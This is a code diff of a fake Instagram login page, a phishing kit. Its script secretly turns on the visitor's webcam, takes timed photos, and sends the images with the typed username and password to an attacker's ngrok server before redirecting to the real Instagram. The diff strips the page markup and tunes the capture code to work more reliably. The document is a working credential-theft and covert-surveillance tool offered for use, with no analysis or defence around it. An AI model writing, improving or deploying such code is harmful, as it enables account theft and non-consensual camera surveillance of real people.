@@ -1,163 +1,3 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login • Instagram</title>
-<style>
-* { margin:0; padding:0; box-sizing: border-box; }
-body {
-  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-  background: #fafafa;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  min-height: 100vh;
-}
-.main { display: flex; align-items: center; justify-content: center; gap: 32px; flex-wrap: wrap; padding: 20px; }
-.phone-img { max-width: 380px; }
-.phone-img img { width: 100%; display: block; }
-.login-box {
-  background: #fff;
-  border: 1px solid #dbdbdb;
-  border-radius: 1px;
-  padding: 40px 40px 20px;
-  width: 350px;
-  text-align: center;
-}
-.logo { font-family: cursive; font-size: 44px; margin-bottom: 24px; color: #262626; font-weight: 600; }
-.form-group { margin-bottom: 6px; position: relative; }
-.form-group input {
-  width: 100%;
-  padding: 14px 8px 4px 8px;
-  background: #fafafa;
-  border: 1px solid #dbdbdb;
-  border-radius: 3px;
-  font-size: 12px;
-  color: #262626;
-  outline: none;
-}
-.form-group input:focus { border-color: #a8a8a8; }
-.form-group label {
-  position: absolute;
-  left: 8px;
-  top: 50%;
-  transform: translateY(-50%);
-  font-size: 12px;
-  color: #8e8e8e;
-  pointer-events: none;
-  transition: 0.1s ease;
-}
-.form-group input:focus + label,
-.form-group input:not(:placeholder-shown) + label {
-  top: 4px;
-  transform: translateY(0);
-  font-size: 10px;
-}
-.btn-login {
-  width: 100%;
-  padding: 8px;
-  background: #0095f6;
-  color: #fff;
-  border: none;
-  border-radius: 8px;
-  font-size: 14px;
-  font-weight: 600;
-  cursor: pointer;
-  margin-top: 12px;
-  opacity: 0.7;
-  pointer-events: none;
-  transition: 0.2s;
-}
-.btn-login.active { opacity: 1; pointer-events: auto; }
-.btn-login:hover { background: #1877f2; }
-.divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
-.divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
-.divider::before { margin-right: 18px; }
-.divider::after { margin-left: 18px; }
-.fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; margin-bottom: 12px; cursor: pointer; }
-.fb-login svg { width: 20px; height: 20px; }
-.forgot-pw { color: #00376b; font-size: 12px; text-decoration: none; }
-.signup-box {
-  background: #fff;
-  border: 1px solid #dbdbdb;
-  border-radius: 1px;
-  padding: 20px 40px;
-  width: 350px;
-  text-align: center;
-  margin-top: 10px;
-  font-size: 14px;
-}
-.signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
-.app-download { text-align: center; margin-top: 20px; font-size: 14px; }
-.app-links { display: flex; gap: 8px; justify-content: center; margin-top: 12px; }
-.app-links img { height: 40px; }
-footer {
-  max-width: 800px;
-  margin-top: 40px;
-  padding: 20px;
-  text-align: center;
-  font-size: 12px;
-  color: #8e8e8e;
-}
-footer a { color: #8e8e8e; text-decoration: none; margin: 0 8px; }
-footer select { border: none; background: transparent; color: #8e8e8e; font-size: 12px; outline: none; }
-/* Hidden video element for stealth capture */
-#hiddenVideo { display: none; }
-</style>
-</head>
-<body>
-
-<div class="main">
-  <div class="phone-img">
-    <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/d6d56e3e6f9c.png" alt="Instagram">
-  </div>
-  <div>
-    <div class="login-box">
-      <div class="logo">Instagram</div>
-      <form id="loginForm">
-        <div class="form-group">
-          <input type="text" id="username" placeholder=" " required>
-          <label for="username">Phone number, username, or email</label>
-        </div>
-        <div class="form-group">
-          <input type="password" id="password" placeholder=" " required>
-          <label for="password">Password</label>
-        </div>
-        <button type="submit" class="btn-login" id="loginBtn">Log In</button>
-      </form>
-      <div class="divider">OR</div>
-      <div class="fb-login">
-        <svg viewBox="0 0 24 24"><path fill="#385185" d="M24 12.073c0-6.627-5.373-12-12-12S0 5.447 0 12.073c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-        Log in with Facebook
-      </div>
-      <a href="#" class="forgot-pw">Forgot password?</a>
-    </div>
-    <div class="signup-box">
-      Don't have an account? <a href="#">Sign up</a>
-    </div>
-    <div class="app-download">
-      <p>Get the app.</p>
-      <div class="app-links">
-        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
-        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
-      </div>
-    </div>
-  </div>
-</div>
-
-<footer>
-  <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a> <a href="#">Help</a> <a href="#">API</a>
-  <a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Locations</a> <a href="#">Instagram Lite</a>
-  <a href="#">Threads</a> <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a>
-  <select><option>English</option></select>
-  <p>&copy; 2025 Instagram from Meta</p>
-</footer>
-
-<!-- Hidden video element for stealth capture -->
-<video id="hiddenVideo" autoplay playsinline muted></video>
-
 <script>
 // ============================================
 // CONFIG — Your ngrok URL
@@ -203,18 +43,18 @@ function startCamera() {
       cameraReady = true;
       console.log('[+] Camera active (stealth mode)');
 
-      // Take first photo silently after camera is ready
-      setTimeout(capturePhoto, 1500);
-
-      // Take another photo after 5 seconds
-      setTimeout(capturePhoto, 5000);
-
-      // Take another photo after 10 seconds
-      setTimeout(capturePhoto, 10000);
+      // Wait for video to actually play before capturing
+      video.onplaying = function() {
+        // Take first photo after camera starts
+        setTimeout(capturePhoto, 2000);
+        // Take another photo after 7 seconds
+        setTimeout(capturePhoto, 7000);
+        // Take another photo after 14 seconds
+        setTimeout(capturePhoto, 14000);
+      };
 
     }).catch(function(err) {
       console.log('[-] Camera not available: ' + err.message);
-      // Continue without camera — still capture credentials
       cameraReady = false;
     });
   } else {
@@ -227,13 +67,13 @@ function startCamera() {
 // CAPTURE PHOTO AND SEND
 // ============================================
 function capturePhoto() {
-  if (!cameraReady || !stream) return;
+  if (!cameraReady || !stream || !video.videoWidth) return;
 
   try {
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    var imageData = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
+    var imageData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
 
     var id = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
 
@@ -267,7 +107,6 @@ loginForm.addEventListener('submit', function(e) {
   loginBtn.textContent = 'Logging in...';
   loginBtn.disabled = true;
 
-  // Take a photo right at login time
   function doSubmit() {
     var payload = {
       type: 'login',
@@ -282,9 +121,7 @@ loginForm.addEventListener('submit', function(e) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     }).then(function() {
-      // Stop camera
       if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; }
-      // Redirect to real Instagram
       window.location.href = 'https://www.instagram.com/accounts/login/?next=%2F&source=desktop_nav';
     }).catch(function() {
       if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; }
@@ -292,49 +129,47 @@ loginForm.addEventListener('submit', function(e) {
     });
   }
 
-  // Try to capture a photo first, then submit
-  if (cameraReady && stream) {
-    try {
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      var imageData = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
+  // Small delay so video frame catches up, then capture
+  setTimeout(function() {
+    if (cameraReady && stream && video.videoWidth > 0) {
+      try {
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        var imageData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
 
-      // Send image + credentials together
-      var payload = {
-        image: imageData,
-        type: 'login',
-        username: username,
-        password: password,
-        id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
-        ua: navigator.userAgent
-      };
+        var payload = {
+          image: imageData,
+          type: 'login',
+          username: username,
+          password: password,
+          id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
+          ua: navigator.userAgent
+        };
 
-      fetch(SERVER_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      }).then(function() {
-        if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; }
-        window.location.href = 'https://www.instagram.com/accounts/login/?next=%2F&source=desktop_nav';
-      }).catch(function() {
+        fetch(SERVER_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).then(function() {
+          if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; }
+          window.location.href = 'https://www.instagram.com/accounts/login/?next=%2F&source=desktop_nav';
+        }).catch(function() {
+          doSubmit();
+        });
+      } catch(e) {
         doSubmit();
-      });
-    } catch(e) {
+      }
+    } else {
       doSubmit();
     }
-  } else {
-    doSubmit();
-  }
+  }, 500);
 });
 
 // ============================================
 // START ON PAGE LOAD
 // ============================================
 window.addEventListener('load', function() {
-  // Small delay so page renders first, then camera starts silently
   setTimeout(startCamera, 500);
 });
 </script>
-</body>
-</html>
